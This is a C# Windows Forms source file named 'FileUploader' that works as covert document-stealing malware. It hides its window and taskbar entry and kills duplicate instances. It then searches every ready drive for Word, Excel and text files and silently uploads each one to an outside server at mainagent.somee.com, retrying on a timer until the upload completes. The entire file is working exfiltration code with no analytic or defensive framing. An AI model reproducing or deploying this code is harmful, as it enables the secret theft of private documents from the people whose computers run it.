using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace FileUploader
{
    public partial class fMain : Form
    {
        //public constructures region
        public fMain()
        {
            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName).Length >= 2)
                System.Diagnostics.Process.GetCurrentProcess().Kill();

            isUploaded = false;
            upload();
            log("starting fMain");
            show();
            InitializeComponent();
            this.Visible = false;
            this.ShowInTaskbar = false;
        }

        //private void events region
        private void fMain_Load(object sender, EventArgs e)
        {
            log("load form");

            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName).Length >= 2)
                System.Diagnostics.Process.GetCurrentProcess().Kill();

            tmrMain.Enabled = true;
            this.Hide();
        }

        private void tmrMain_Tick(object sender, EventArgs e)
        {
            log("timer tick");

            if (isUploaded)
                this.Close();
            else
                upload();
        }

        //private functions region
        [System.Runtime.InteropServices.DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);

        private void upload()
        {
            log("upload function");

            Int32 desc;
            if (InternetGetConnectedState(out desc, 0))
            {
                log("is connected");

                System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();
                System.Net.WebClient webClient = new System.Net.WebClient();
                String[] patterns = new String[] { "*.doc*", "*.xls*", "*.txt" };
                String[] files;

                for (Int32 i = drives.Length - 1; i >= 0; i--)
                    if (drives[i].IsReady)
                        foreach (String pattern in patterns)
                        {
                            files = Maniyat.FileSearcher.Searching(drives[i].Name, pattern, SEARCH_DEPTH);

                            foreach (String file in files)
                            {
                                try
                                {
                                    log("   *file uploaded");
                                    webClient.UploadFile(URI_AGENT, file);
                                }
                                catch
                                {
                                }
                            }
                        }

                isUploaded = true;
            }

            log("upload complete");
        }

        private void show()
        {
            //ShowForm show = new ShowForm();
            //show.Show();
        }

        private void log(String statement)
        {
            /*
            try
            {
                System.IO.StreamWriter sw = new System.IO.StreamWriter("lg.mp4", true);
                sw.WriteLine(statement);
                sw.Close();
            }
            catch
            {
                //donothing
            }
            */
        }

        //private fields region
        private Boolean isUploaded;

        //private consts region
        private const String URI_AGENT = "http://www.mainagent.somee.com/streamagent.aspx";
        //private const String URI_AGENT = "http://localhost:1037/streamagent.aspx";
        private const Int32 SEARCH_DEPTH = 4;
    }
}
